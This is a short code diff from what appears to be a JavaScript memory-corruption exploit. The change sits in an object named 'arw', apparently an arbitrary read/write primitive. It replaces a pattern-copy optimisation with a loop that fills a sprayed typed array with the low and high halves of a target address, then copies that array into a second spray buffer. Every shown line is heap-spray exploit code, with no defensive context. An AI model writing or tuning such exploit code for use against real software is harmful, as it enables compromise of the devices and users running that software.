@@ -125,17 +125,9 @@ const arw = {
         const spray_1_u32 = new Uint32Array(spray[1]);
         const spray_2_u32 = new Uint32Array(spray[2]);
 
-        // The original loop wrote lo/hi pairs one at a time. Build one small
-        // pattern and let the native TypedArray.set copy it across; same bytes,
-        // far fewer JS iterations.
-        const pattern = new Uint32Array(0x1000);
-        for (let i = 0; i < pattern.length; i += 2) {
-          pattern[i] = addr.lo;
-          pattern[i + 1] = addr.hi;
-        }
-
-        for (let off = 0; off < spray_1_u32.length; off += pattern.length) {
-          spray_1_u32.set(pattern, off);
+        for (let j = 0; j < spray_1_u32.length; j += 2) {
+          spray_1_u32[j] = addr.lo;
+          spray_1_u32[j + 1] = addr.hi;
         }
 
         spray_2_u32.set(spray_1_u32);
